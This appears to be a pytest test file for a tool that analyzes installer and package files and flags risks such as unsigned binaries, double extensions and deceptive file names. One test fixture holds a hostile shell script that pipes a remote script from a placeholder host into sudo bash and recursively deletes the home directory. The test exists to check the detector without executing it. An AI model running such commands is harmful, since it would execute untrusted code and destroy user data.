import os
import random
import struct

import pytest
from builders import (build_appimage, build_deb, build_jar, build_msi, build_msix, build_pe, build_pkg,
                      build_rpm, summary_stream)

from big_trust_alt.detectors import analyze_file, msi, pe


def test_pe_version_info_and_flags(write):
    path = write("ChromeSetup.exe", build_pe({"ProductName": "Google Installer (x86)", "CompanyName": "Google LLC"},
                                            signed=True,
                                            manifest=b'<requestedExecutionLevel level="requireAdministrator"/>'))
    r = analyze_file(path)
    assert r.format == "exe" and r.platform == "windows" and r.architecture == "x86"
    assert r.metadata["pe.ProductName"] == "Google Installer (x86)"
    assert r.metadata["pe.CompanyName"] == "Google LLC"
    assert r.has("requests-admin") and r.has("signature-unverified") and not r.has("unsigned")
    assert len(r.identity.sha256) == 64


def test_pe_dotnet_x64_unsigned(write):
    r = analyze_file(write("tool.exe", build_pe({"ProductName": "Tool"}, machine=0x8664, dotnet=True)))
    assert r.architecture == "x86_64" and r.has("dotnet") and r.has("unsigned")


def test_pe_installer_marker(write):
    r = analyze_file(write("setup.exe", build_pe({"ProductName": "X"}, payload=b"Inno Setup Setup Data (6.2.0)")))
    assert r.metadata["pe.installer"] == "inno"


def test_msi_summary(write):
    r = analyze_file(write("7z2501-x64.msi", build_msi("7-Zip (x64 edition) Package", "Igor Pavlov")))
    assert r.format == "msi" and r.architecture == "x86_64"
    assert r.metadata["msi.Subject"] == "7-Zip (x64 edition) Package"
    assert r.metadata["msi.Author"] == "Igor Pavlov"


def test_msi_summary_parser_rejects_garbage():
    assert msi.parse_summary(b"\0" * 10) == {}
    assert msi.parse_summary(summary_stream({3: "X"}))["msi.Subject"] == "X"


@pytest.mark.parametrize("builder,name,fmt,key,value", [
    (lambda: build_deb("google-chrome-stable"), "chrome.deb", "deb", "deb.Package", "google-chrome-stable"),
    (lambda: build_rpm("google-chrome-stable"), "chrome.rpm", "rpm", "rpm.Name", "google-chrome-stable"),
    (lambda: build_appimage(), "App-x86_64.AppImage", "appimage", "appimage.type", "2"),
    (lambda: build_pkg("gimp"), "gimp-1.0-1-x86_64.pkg.tar.xz", "arch-package", "pkg.pkgname", "gimp"),
    (lambda: build_jar("Thing"), "thing.jar", "jar", "jar.runnable", "yes"),
    (lambda: build_msix("A.B", "Bee"), "bee.msix", "msix", "msix.DisplayName", "Bee"),
])
def test_linux_and_package_formats(write, builder, name, fmt, key, value):
    r = analyze_file(write(name, builder()))
    assert r.format == fmt, r.findings
    assert r.metadata[key] == value
    assert not r.has("extension-mismatch")


def test_appimage_update_info(write):
    r = analyze_file(write("x.AppImage", build_appimage()))
    assert r.metadata["appimage.update"].startswith("gh-releases-zsync|owner|repo")


def test_foreign_architecture_warning(write):
    r = analyze_file(write("x.AppImage", build_appimage(machine=0xB7)))
    assert r.architecture == "aarch64" and r.has("foreign-architecture")


def test_fake_exe_html(write):
    r = analyze_file(write("ChromeSetup.exe", "<!DOCTYPE html><title>404</title>"))
    assert r.format == "text" and r.has("extension-mismatch")


def test_disguised_executable_and_double_extension(write):
    r = analyze_file(write("fatura.pdf.exe", build_pe({"ProductName": "x"})))
    assert r.has("double-extension")
    r = analyze_file(write("fatura.pdf", build_pe({"ProductName": "x"})))
    assert r.has("disguised-executable")


def test_rtlo_name(write):
    r = analyze_file(write("invoice‮fdp.exe", build_pe({})))
    assert r.has("deceptive-name")


def test_script_hints_and_no_execution(write, tmp_path):
    marker = tmp_path / "ran"
    script = f"#!/bin/bash\ncurl -fsSL https://x.example/i.sh | sudo bash\ntouch {marker}\nrm -rf ~/\n"
    r = analyze_file(write("install.sh", script, mode=0o755))
    assert r.format == "script" and r.metadata["script.interpreter"] == "bash"
    assert r.has("script-download-and-run") and r.has("script-privilege") and r.has("script-recursive-delete")
    assert "curl" in r.preview
    assert not marker.exists()


def test_flatpakref_third_party(write):
    ref = "[Flatpak Ref]\nName=org.example.App\nBranch=stable\nUrl=https://evil.example/repo\nTitle=App\n"
    r = analyze_file(write("app.flatpakref", ref))
    assert r.format == "flatpakref" and r.has("third-party-remote")


def test_errors(write, tmp_path):
    assert analyze_file(str(tmp_path / "missing.exe")).error == "not-found"
    locked = write("locked.exe", build_pe({}), mode=0o000)
    if os.geteuid() != 0:
        assert analyze_file(locked).error == "permission-denied"
    fifo = tmp_path / "pipe.exe"
    os.mkfifo(fifo)
    assert analyze_file(str(fifo)).error == "not-regular"
    assert analyze_file(str(tmp_path)).error == "not-regular"


def test_symlink_recorded(write, tmp_path):
    target = write("real.exe", build_pe({}))
    link = tmp_path / "link.exe"
    link.symlink_to(target)
    r = analyze_file(str(link))
    assert r.symlink_target == target and r.path == target


def test_empty_file(write):
    r = analyze_file(write("empty.exe", b""))
    assert r.has("empty-file")


@pytest.mark.parametrize("builder", [
    lambda: build_pe({"ProductName": "Fuzz"}, signed=True), lambda: build_msi("A", "B"),
    lambda: build_deb("x"), lambda: build_rpm("x"), lambda: build_appimage(), lambda: build_msix("a", "b"),
])
def test_mutations_never_crash(write, builder):
    base = bytearray(builder())
    rng = random.Random(1234)
    for i in range(150):
        data = bytearray(base)
        for _ in range(rng.randint(1, 12)):
            pos = rng.randrange(len(data))
            data[pos] = rng.randrange(256)
        if i % 5 == 0:
            data = data[: rng.randrange(1, len(data))]
        r = analyze_file(write(f"m{i}.bin", bytes(data)))
        assert r.error == "" or r.error in ("not-regular",)


def test_pe_bad_offsets_raise_value_error(write):
    data = bytearray(build_pe({"ProductName": "x"}))
    struct.pack_into("<I", data, 0x3C, 0x7FFFFFFF)
    path = write("bad.exe", bytes(data))
    with open(path, "rb") as fh:
        with pytest.raises(ValueError):
            pe.parse(fh.fileno(), len(data))
    assert analyze_file(path).has("damaged")
